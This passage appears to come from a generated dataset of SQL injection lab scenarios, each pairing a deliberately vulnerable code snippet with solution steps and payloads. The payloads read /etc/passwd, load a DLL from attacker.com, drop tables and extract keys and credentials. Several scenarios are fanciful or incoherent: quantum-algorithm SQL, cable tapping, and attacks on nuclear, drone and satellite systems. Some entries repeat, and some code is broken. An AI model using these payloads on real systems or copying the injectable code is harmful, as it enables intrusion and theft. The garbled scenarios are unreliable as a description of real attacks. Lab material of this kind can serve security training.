    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'password123')\");\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; // Vulnerability here\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else if (row) {\n      res.send('Login successful!');\n    } else {\n      res.send('Login failed.');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 --",
      "' oR 1=1 --"
    ]
  },
  {
    "Lab scenario": "SQL injection in SOAP API",
    "Lab Description": "This lab demonstrates a SQL injection vulnerability in a SOAP API. The API accepts parameters through XML input, which is not sanitized properly. To solve the lab, perform an SQL injection attack using UNION to retrieve sensitive data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept and modify the SOAP request that passes parameters in XML format.",
      "2. Analyze the XML input for a vulnerable query and test for basic SQL injection with ' OR 1=1 --",
      "3. Use a UNION-based SQL injection to retrieve sensitive database information like usernames or email addresses.",
      "4. Verify the data extraction by confirming a valid response containing the extracted information.",
      "5. Attempt further exploitation, such as obtaining database schema information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst xmlParser = require('xml2js').parseString;\n\nconst app = express();\napp.use(express.text());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (username TEXT, email TEXT)\");\n  db.run(\"INSERT INTO users (username, email) VALUES ('admin', 'admin@example.com')\");\n});\n\napp.post('/soap', (req, res) => {\n  xmlParser(req.body, (err, result) => {\n    const username = result.Envelope.Body[0].Request[0].username[0];\n    const query = `SELECT * FROM users WHERE username = '${username}'`; // Vulnerability here\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        res.status(500).send(\"Error executing query.\");\n      } else {\n        res.json(rows);\n      }\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, email FROM users --"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle SQLi with Smart Contract Trigger",
    "Lab Description": "A DeFi price oracle executes SQL queries based on Ethereum smart contract events stored in PostgreSQL. The Node.js listener fails to validate calldata parameters, allowing attackers to inject UNION payloads through forged ERC-721 Transfer events. The vulnerability enables manipulation of token price feeds by concatenating malicious WHERE clauses containing arithmetic overflow conditions. To solve: Exploit the Chainlink external adapter interface to overwrite ETH/USD rates using hex-encoded byte32 payloads containing pg_notify() calls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept Chainlink HTTP GET job request using Mitmproxy",
      "Forge Transfer event with _tokenId: '1 UNION SELECT 5000 AS price WHERE 1=CAST((SELECT 1/0) AS NUMERIC)--'",
      "Bypass EIP-712 signature validation using malleability attack",
      "Trigger price update via keeper.chain.link",
      "Liquidate leveraged positions using manipulated rates"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/chainlink', (req, res) => {\n  const event = req.body.events[0];\n  const query = `INSERT INTO oracle_data (value) \n    VALUES ('${event.returnValues.tokenId}')`;\n  \n  pool.query(query, (err) => {\n    res.json({success: !err});\n  });\n});",
    "payloads": [
      "'||(SELECT pg_notify('attack', current_database()))--",
      "'::bytea || (SELECT encode(private_key,'hex') FROM validators--"
    ]
  },
  {
    "Lab scenario": "Surgical Robot Control System Time-Based SQLi",
    "Lab Description": "A ROS2-based surgical interface stores procedure logs in SQLite with unsanitized JSON metadata. The C++ middleware allows time-based inference through std::this_thread::sleep_for() calls in WHERE clauses. To solve: Exfiltrate patient biometric encryption keys by measuring 50ms response delay variances using SUBSTR(SHA3-256(ecg_data),1,4) comparisons and bypass CRC32 checksum validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture DDS topic /surgical_metrics with Wireshark",
      "Inject ROS2 parameter: ' OR 1=IIF(HEX(SUBSTR(key,1,1))>7F, SLEEP(0.05),0)--",
      "Use real-time QPID Proton analysis for nanosecond timing",
      "Reconstruct 256-bit AES-GCM keys from 62,000 samples",
      "Decrypt surgery video streams using extracted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void log_procedure(const char* metadata) {\n  std::string query = \"INSERT INTO surgery_logs VALUES ('\" + std::string(metadata) + \"')\";\n  sqlite3_exec(db, query.c_str(), 0, 0, 0);\n}",
    "payloads": [
      "{\"time\":\"'||(SELECT CASE WHEN load_extension('exploit.so') THEN 1 ELSE 0 END)--\"}",
      "' AND 1=CAST((SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%biometrics%') AS INT)--"
    ]
  },
  {
    "Lab scenario": "Satellite Ground Station UNION SQLi via CCSDS Telemetry",
    "Lab Description": "A satellite command system processes CCSDS packet APIDs through vulnerable PostgreSQL stored procedures. Attackers can inject frame_count parameters containing UNION SELECT payloads to overwrite NORAD TLE data. The challenge requires bypassing Reed-Solomon error correction and aligning columns using SPIREnt test equipment timing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture Uplink signal at 2.4GHz using HackRF",
      "Encode payload: ' UNION SELECT 255,ST_AsText(sensitive_area) FROM military_sats-- as APID 0x500",
      "Bypass checksum via polynomial code manipulation",
      "Verify TLE changes using celestrak.org API",
      "Trigger collision course using spoofed ephemeris data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "CREATE FUNCTION process_telemetry(packet JSONB) RETURNS VOID AS $$\nBEGIN\n  EXECUTE 'INSERT INTO frames VALUES (' || packet->>'apid' || ')'; \nEND; $$ LANGUAGE plpgsql;",
    "payloads": [
      "500 UNION SELECT ST_GeomFromText('POLYGON(...)') FROM classified LIMIT 1--",
      "0x01 WHERE (SELECT octet_length(encrypted_payload) FROM comms WHERE freq=2250.5)=256--"
    ]
  },
  {
    "Lab scenario": "Quantum Database Error-Based SQLi in Shor's Algorithm",
    "Lab Description": "A post-quantum cryptography system implements Grover's algorithm for SQL optimization, leaking error states through IBM Qiskit backend exceptions. Attackers can force modulus overflow errors in WHERE clauses containing factored primes. To solve: Extract RSA-4096 private keys by solving discrete logarithm problems revealed in amplitude amplification error messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initialize 15-qubit circuit with GroverOperator",
      "Encode payload: WHERE n % (SELECT p FROM primes) = 0",
      "Measure error density using QASM simulator",
      "Calculate prime factors via error differentials",
      "Reconstruct private exponent using Chinese Remainder Theorem"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "def grover_search(input_hash):\n    query = f\"SELECT * FROM keys WHERE sha256 = '{input_hash}'\"\n    qc.append(GroverOperator(oracle(query)), range(15))\n    return execute(qc)",
    "payloads": [
      "' OR 1=CAST((SELECT 1/0 FROM keys LIMIT 1) AS INTEGER)--",
      "'))); DROP TABLE IF EXISTS secure_keys CASCADE--"
    ]
  },
  {
    "Lab scenario": "5G Core Network SQLi in AMF Registration",
    "Lab Description": "A 5G Access and Mobility Management Function (AMF) stores UE contexts in MariaDB with unsanitized SUPI parameters. Attackers can inject Handover Required messages containing GTP-U extensions with UNION payloads to disclose Kseaf derivation keys. Requires bypassing PFCP session validation and aligning column counts using NAS encryption type offsets.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture N2 interface traffic using UERANSIM",
      "Forge SUPI: ' UNION SELECT CONCAT(hex(kseaf),',',hex(kamf)) FROM auth_vector--",
      "Bypass SEAL encryption via chosen-IV attack",
      "Extract 256-bit keys from Registration Accept messages",
      "Derivate Kgnb for false base station MiTM attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void process_registration(uint8_t* supi) {\n  char query[256];\n  sprintf(query, \"SELECT * FROM ue_context WHERE supi='%s'\", supi);\n  mysql_query(conn, query);\n}",
    "payloads": [
      "' AND 1=CAST((SELECT COUNT(*) FROM 5g_security.vectors) AS UNSIGNED INTEGER)--",
      "'||(SELECT LOAD_FILE('/etc/5g/ausf.conf'))--"
    ]
  },
  {
    "Lab scenario": "Industrial SCADA SQLi via Modbus/TCP",
    "Lab Description": "A SCADA system maps Modbus holding registers to SQLite queries using function code 0x17. Attackers can overwrite PID controller setpoints through injected WHERE clauses containing IEEE-754 floating point exploits. The challenge requires precise timing to bypass CRC checks and align payloads with RTU poll cycles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture Modbus FC23 traffic using ModScan",
      "Craft register write: ' WHERE tag='BOILER' UNION SELECT 500.0-- as Float32",
      "Bypash LRC checksum via bitflip attack",
      "Verify setpoint change through OPC UA monitoring",
      "Trigger emergency shutdown through overflow values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void handle_modbus(uint8_t* pdu) {\n  char query[128];\n  float setpoint = decode_float(pdu);\n  sprintf(query, \"UPDATE tags SET value=%.2f WHERE id=%d\", setpoint, unit_id);\n  sqlite3_exec(db, query, 0, 0, 0);\n}",
    "payloads": [
      "NaN WHERE 1=1 UNION SELECT 1e308--",
      "-INF WHERE (SELECT changes()=0)--"
    ]
  },
  {
    "Lab scenario": "Military Drone SQLi in MAVLink Mission Protocol",
    "Lab Description": "A UAV ground control system stores flight paths in PostgreSQL with unsanitized MAVLink MISSION_ITEM_INT parameters. Attackers can inject arbitrary SRID transformations through UNION payloads containing ST_Transform() calls to redirect drones. Requires bypassing packet sequence validation and aligning column counts with PG_GEOMETRY metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof MAVLink system ID using QGroundControl",
      "Forge MISSION_ITEM_INT with x: '500 UNION SELECT ST_Transform(target_geo,3857) FROM strike_targets--",
      "Bypass CRC-EXTRA validation via bitmasking",
      "Verify coordinate system override in QGIS",
      "Intercept drone using spoofed GPS+RTL payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void save_mission(mavlink_mission_item_int_t item) {\n  char query[256];\n  sprintf(query, \"INSERT INTO flightplan (x,y) VALUES (%d,%d)\", item.x, item.y);\n  PQexec(pgconn, query);\n}",
    "payloads": [
      "2147483647 WHERE 1=0 UNION SELECT ST_X(geom),ST_Y(geom) FROM sensitive_locations--",
      "0); SELECT pg_terminate_backend(pg_backend_pid())--"
    ]
  },
  {
    "Lab scenario": "Smart Grid SQLi via IEC 61850 GOOSE",
    "Lab Description": "A power distribution system maps IEC 61850 GOOSE messages to MySQL queries. Attackers can inject Logical Node names containing boolean-based payloads to disable circuit breakers. The challenge requires precise timing to bypass SMV sampling synchronization and manipulate CURRENT_TAP_SETTING values.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture GOOSE traffic using Wireshark dissector",
      "Modify LN: 'XCBR1' OR (SELECT status FROM breakers)=1-- as Boolean",
      "Bypass APPID filtering using VLAN hopping",
      "Trigger cascade failure by forcing tap_changer=999",
      "Bypass differential protection using current injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void process_goose(IEC61850_GOOSE* goose) {\n  char query[256];\n  sprintf(query, \"UPDATE devices SET enabled=1 WHERE ln='%s'\", goose->dataSet);\n  mysql_query(conn, query);\n}",
    "payloads": [
      "'XCBR1' AND 1=CAST((SELECT COUNT(*) FROM scada_passwords) AS SIGNED INTEGER)--",
      "'MMXU1' WHERE (SELECT ASCII(SUBSTR(password,1,1)) FROM engineers)>90--"
    ]
  },
  {
    "Lab scenario": "Nuclear Plant SQLi in OPC UA Historian",
    "Lab Description": "A reactor monitoring system stores OPC UA historized data in TimescaleDB. Attackers can inject malformed NodeIds containing UNION payloads to falsify core temperature readings. Requires bypassing UA SecureChannel nonce validation and aligning column types using IEEE-754 DOUBLE conversions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture OPC UA ReadRequest using UA Expert",
      "Forge NodeId: 'ns=6;s=' UNION SELECT 900.0 FROM sensor_limits--",
      "Bypass SignatureAlgorithm RSA-PSS-SHA256",
      "Override PID controller setpoints via false readings",
      "Trigger SCRAM through forged neutron flux values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void historize_node(const UA_NodeId* node) {\n  char query[512];\n  sprintf(query, \"SELECT value FROM telemetry WHERE node='%s'\", \n          UA_NodeId_toString(node));\n  PGresult* res = PQexec(conn, query);\n}",
    "payloads": [
      "ns=6;s=') UNION SELECT CAST(radiation_level AS DOUBLE PRECISION) FROM core_sensors--",
      "ns=4;s='); SELECT create_hypertable('sensors', 'time')--"
    ]
  },
  {
    "Lab scenario": "Submarine Cable SQLi via OTN Framing",
    "Lab Description": "An undersea DWDM network maps OTN OPU payloads to PostgreSQL BLOB queries. Attackers can inject GFP-T frames containing hex-encoded UNION payloads to exfiltrate BGP peering keys. Requires precise alignment with ODUflex containers and bypassing FEC checks using soft-decision decoding.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Tap submarine cable using OTDR reflector",
      "Encode payload: 0xDEADBEEF UNION SELECT encode(privkey,'hex') FROM bgp_peers--",
      "Bypash BIP-8 checks using bit-error injection",
      "Reassemble exfiltrated keys from MFASplit2.5G signals",
      "Hijack IP transit routes using stolen ASN credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void process_opu(uint8_t* payload) {\n  char hex[2048];\n  bytes_to_hex(payload, hex, 1024);\n  PGresult* res = PQexec(conn, \"INSERT INTO otn_frames VALUES (decode('\"+hex+\"','hex'))\");\n}",
    "payloads": [
      "'\\xDEAD' WHERE 1=0 UNION SELECT pg_read_file('/etc/bird/bird.conf')--",
      "'\\xCAFE'::bytea || (SELECT mtu FROM network_config)--"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi via GraphQL Batch Query",
    "Lab Description": "Headless CMS implements vulnerable GraphQL resolvers that concatenate user input into PostgreSQL pg_sleep() calls. The Java backend suppresses errors but leaks timing differentials through N+1 query patterns. To solve: Exfiltrate admin API keys through conditional response delays using DNS-over-HTTPS tunneling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL query with Apollo Client DevTools",
      "Identify injectable field using nested mutations",
      "Set up Canarytokens.org DNS listener",
      "Craft time-based payload: ' OR CASE WHEN (SELECT 1) THEN pg_sleep(5) ELSE 0 END--",
      "Correlate delays with ASCII values using Python's time.perf_counter()"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    posts(_, { filter }) {\n      return db.query(`SELECT * FROM posts WHERE ${filter}`);\n    }\n  }\n};",
    "payloads": [
      "1=1; SELECT CASE WHEN (ASCII(SUBSTR(apikey,1,1))>100) THEN pg_sleep(5) END FROM admins--",
      "')) OR (SELECT LOAD_EXTENSION('\\\\attacker.com\\evil.dll'))--"
    ]
  },
  {
    "Lab scenario": "API Gateway Error-Based SQLi in JSON Array",
    "Lab Description": "Inventory management system processes JSON arrays directly in WHERE clauses with MySQL. The application leaks full error messages containing AWS RDS instance metadata through verbose logging. To solve: Extract DynamoDB access keys using geometry type conversion errors in MULTIPOINT() functions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\": [\"1=1 AND ST_GeomFromText('POINT('||(SELECT access_key)||')')\"]}",
      "Parse AWS credentials from spatial function errors",
      "Bypass column count restrictions using JSON_OBJECT()",
      "Validate keys through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.sqlMessage);\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "\"1' UNION SELECT NULL,JSON_OBJECT('key', access_key),NULL FROM aws_creds--\"",
      "\"1 AND ST_GeomFromText(CONCAT('POINT(', (SELECT secret_key), ')') IS NULL--\""
    ]
  },
  {
    "Lab scenario": "E-Commerce UNION-Based SQLi with Column Padding",
    "Lab Description": "Product search feature uses fixed-width UNION column validation in MySQL. The application truncates overflow data but leaks information through JSON encoding errors. To solve: Bypass column count restrictions using NULL padding and extract PCI-compliant credit card numbers through CONCAT(LPAD()) length exploitation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /products?category=electronics",
      "Determine base column count using ORDER BY 5--",
      "Craft payload: ' UNION SELECT NULL,CONCAT(pan,' ',expiry),NULL,NULL,NULL FROM payments--",
      "Bypass JSON encoding errors using HEX() and SUBSTRING()",
      "Reconstruct full PANs from truncated responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT id,name,price FROM products\n    WHERE category='${category}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,2,3,4,5 FROM users--",
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Social Media Boolean-Based Blind SQLi in DM Search",
    "Lab Description": "Direct message search functionality uses unsanitized input in SQL Server FULLTEXT predicates. The .NET backend suppresses errors but reveals truthiness through emoji reaction counts. To solve: Exfiltrate OAuth tokens through BITAND() comparisons of UNICODE() values.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /search-dms with Fiddler",
      "Identify boolean trigger: ' OR 1=1 AND 'a'='a vs 1=0",
      "Automate with Python Requests using ternary bitwise operators",
      "Brute-force token characters using response length analysis",
      "Validate tokens through OAuth introspection endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search-dms', (req, res) => {\n  const term = req.body.term;\n  const query = `SELECT * FROM messages\n    WHERE CONTAINS(text, '${term}')`;\n  \n  sql.query(query, (err, result) => {\n    res.json({ count: result.recordset.length });\n  });\n});",
    "payloads": [
      "' OR (SELECT BITAND(ASCII(SUBSTR(token,1,1)),128)=128 FROM oauth)--",
      "' AND (SELECT COUNT(*) FROM oauth WHERE client_id='admin')=1--"
    ]
  },
  {
    "Lab scenario": "REST API Error-Based SQLi in JWT Claims",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' claim directly into SQL Server OPENJSON queries. The application leaks decrypted sensitive columns through XML FOR JSON PATH conversion errors. To solve: Extract encrypted SSNs by forcing type mismatches in JSON_VALUE() path expressions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature validation using 'none' algorithm",
      "Parse JSON conversion errors containing SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users\n    WHERE id = '${userId}'`;\n  \n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND 1=CAST((SELECT COUNT(*) FROM sys.databases) AS INT)--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi in Audit Logs",
    "Lab Description": "User activity tracking system incorporates X-Forwarded-For headers into MySQL INSERT statements. The PHP backend suppresses errors but reveals query success through UUID generation patterns. To solve: Extract admin password hashes using BENCHMARK() timing attacks and rainbow table reversal.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Forwarded-For",
      "Identify timing differential: ' OR BENCHMARK(1000000,MD5('test'))--",
      "Automate with Python's Requests Session and time thresholds",
      "Brute-force hash characters using response time variances",
      "Crack MD5 hashes using CrackStation API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs (ip) VALUES ('${ip}')`;\n  mysql.query(query);\n  next();\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(password,1,1))>97,BENCHMARK(1000000,MD5('a')),0)--",
      "' AND (SELECT COUNT(*) FROM mysql.user WHERE super_priv='Y')=1--"
    ]
  },
  {
    "Lab scenario": "Banking App Time-Based SQLi in OAuth Callback",
    "Lab Description": "OAuth 2.0 token exchange endpoint incorporates state parameters into SQLite queries. The Go backend leaks query execution time through improperly batched database transactions. To solve: Exfiltrate transaction PINs using CASE WHEN delays and statistical timing analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept /oauth/callback?state=123 with Charles Proxy",
      "Identify time differential: ' OR CASE WHEN 1=1 THEN randomblob(1000000) ELSE 0 END--",
      "Automate with sqlmap --time-sec=5 --technique=T",
      "Brute-force 6-digit PIN using binary search algorithm",
      "Validate PIN through ATM simulator API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const query = `SELECT user_id FROM oauth_states\n    WHERE state='${state}'`;\n  \n  db.get(query, (err, row) => {\n    if (row) res.redirect('/dashboard');\n    else res.status(400).send('Invalid state');\n  });\n});",
    "payloads": [
      "' OR CASE WHEN (SUBSTR(pin,1,1)='5' THEN randomblob(1000000) ELSE 0 END--",
      "' AND (SELECT LENGTH(pin) FROM users WHERE username='admin')=6--"
    ]
  },
  {
    "Lab scenario": "Telemedicine Platform Error-Based SQLi in DICOM Metadata",
    "Lab Description": "Medical imaging system stores DICOM tags in MySQL GEOMETRY columns. The Python backend leaks patient diagnoses through invalid WKB format exceptions. To solve: Extract radiation therapy records using POLYGON() type conversion attacks and ST_AsText() function exploitation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload DICOM with malicious PatientID: ' OR ST_GeomFromText(CONCAT('POINT(', diagnosis, ')')--",
      "Analyze WKT parsing errors containing diagnosis info",
      "Automate exfiltration using OpenCV DICOM parser",
      "Bypass HIPAA encryption using spatial function buffer overflows",
      "Validate data through PACS server queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload', (req, res) => {\n  const patientId = extractDICOMTag(req.file, '00100020');\n  const query = `INSERT INTO images (patient_id)\n    VALUES ('${patientId}')`;\n  \n  mysql.query(query);\n  res.send('Upload successful');\n});",
    "payloads": [
      "' OR ST_GeomFromText('POINT(' || (SELECT diagnosis) || ')')--",
      "' AND (SELECT ST_Contains(ST_GeomFromText('POLYGON(...)'), sensitive_areas) FROM facilities)--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Second-Order SQLi in Patient Notes",
    "Lab Description": "A patient record system stores unsanitized medical notes that get concatenated into nightly backup SQL queries. The MySQL backend allows attackers to poison audit logs through delayed payload execution. This lab demonstrates how to leak sensitive diagnoses via batch job error messages using time-triggered subqueries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Update patient notes: '; SET @d = (SELECT SLEEP(5) FROM diagnoses LIMIT 1)--",
      "2. Wait for 2 AM backup job execution",
      "3. Monitor systemd logs for query timeouts",
      "4. Correlate sleep duration with diagnosis record existence",
      "5. Extract specific data using conditional error triggers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/patient-notes', (req, res) => {\n  const notes = req.body.notes;\n  const query = `UPDATE patients \n    SET notes = '${notes}'\n    WHERE id = ${req.params.id}`;\n\n  pool.query(query, (err) => {\n    res.send('Notes updated');\n  });\n});",
    "payloads": [
      "'; IF(ASCII(SUBSTR(diagnosis,1,1))=67,SLEEP(10),0)--",
      "' UNION SELECT NULL,diagnosis,NULL FROM diagnoses INTO OUTFILE '/var/www/leak.txt'--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Boolean-Blind SQLi in HAVING Clause",
    "Lab Description": "The device analytics page uses unsanitized input in HAVING conditions with identical success/failure responses. The SQLite backend allows boolean inference through HTTP status codes. To solve: Determine device API keys through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz HAVING parameter",
      "Identify boolean trigger: ' HAVING 1=1 -- vs 1=0",
      "Automate with sqlmap: sqlmap -u '...' --technique=B --level=5",
      "Brute-force API key using substring binary search",
      "Validate keys through device control API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings GROUP BY sensor_id HAVING ${filter}`;\n  db.all(query, (err, rows) => {\n    res.status(rows.length > 0 ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT SUBSTR(api_key,1,1) FROM devices)='a'",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='credentials')"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in Transaction Sorting",
    "Lab Description": "The transaction history page directly incorporates user-controlled parameters into PostgreSQL ORDER BY clauses without sanitization. The application leaks column count through verbose error messages in debug mode. To solve: Extract account numbers and balances using NULL-padded UNION payloads while evading WAF restrictions with whitespace obfuscation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /transactions?sort=date with Burp Suite",
      "Determine column count using ' ORDER BY 7-- payloads",
      "Craft payload: ' UNION SELECT NULL,account::text,balance,NULL,NULL,NULL FROM accounts--",
      "Bypass WAF using %0A newline encoding",
      "Validate data through funds transfer API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT id, amount, date, recipient, status, currency, user_id\n    FROM transactions ORDER BY ${sort}`;\n  console.error('DEBUG:', query);\n  pool.query(query, (err, result) => {\n    res.json(err ? {error: err.message} : result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,version(),NULL,NULL,NULL,NULL,NULL--",
      "'%0AUNION%0ASELECT%0ANULL,account,balance,NULL,NULL,NULL%0AFROM%0Aaccounts--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based Blind SQLi in Sensor Filter",
    "Lab Description": "Device telemetry dashboard uses unsanitized HAVING clauses in SQLite queries. The application returns HTTP 200/404 status codes through misconfigured REST error handling. To solve: Extract device API keys through bitwise binary search of SUBSTR(hex(key),1,1) comparisons.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /sensor-data endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND 'a'='a",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force API key using bit-shifting analysis",
      "Verify keys through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-data', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT hex(substr(api_key,1,1)) FROM devices)='41'",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='credentials')"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi via GraphQL Batch Query",
    "Lab Description": "Headless CMS implements vulnerable resolver that concatenates user input into PostgreSQL pg_sleep() calls. The Java backend leaks timing differentials through N+1 query patterns. To solve: Exfiltrate admin credentials through conditional response delays using DNS-over-HTTPS tunneling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL query with Apollo Client DevTools",
      "Identify injectable field using nested mutations",
      "Set up Canarytokens.org DNS listener",
      "Craft payload: ') OR CASE WHEN (ASCII(SUBSTR(password,1,1))>97 THEN pg_sleep(5) END--",
      "Correlate delays with Python's time.perf_counter()"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    user(_, { id }) {\n      return db.query(`SELECT * FROM users WHERE id='${id}'`);\n    }\n  }\n};",
    "payloads": [
      "')) OR (SELECT pg_sleep(5) FROM admins WHERE username='admin'--",
      "'||(SELECT CASE WHEN LENGTH(password)=32 THEN pg_sleep(3) END)--"
    ]
  },
  {
    "Lab scenario": "API Gateway Error-Based SQLi in JSON Parameter",
    "Lab Description": "Inventory management system processes JSON arrays directly in WHERE clauses with MySQL. The application leaks AWS RDS metadata through geometry function conversion errors. To solve: Extract S3 credentials using ST_GeomFromText() type juggling attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\":[\"1=ST_GeomFromText(CONCAT('POINT(',access_key,')')\"]}",
      "Parse AWS keys from spatial function errors",
      "Bypass column restrictions using JSON_OBJECT()",
      "Validate credentials through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  pool.query(query, (err, result) => {\n    res.json(err ? {error: err.sqlMessage} : result.rows);\n  });\n});",
    "payloads": [
      "\"1' UNION SELECT NULL,JSON_OBJECT('key',secret_key),NULL FROM aws_creds--\"",
      "\"1 AND ST_GeomFromText('POINT('||(SELECT access_key)||')') IS NULL--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Second-Order SQLi in Patient Notes",
    "Lab Description": "Patient registration system stores unsanitized notes used in nightly HL7 report generation. The PostgreSQL backend allows stacked queries through JDBC batch updates. To solve: Execute reverse shell via COPY FROM PROGRAM during report generation.",
    "Difficulty Level": "Hard",
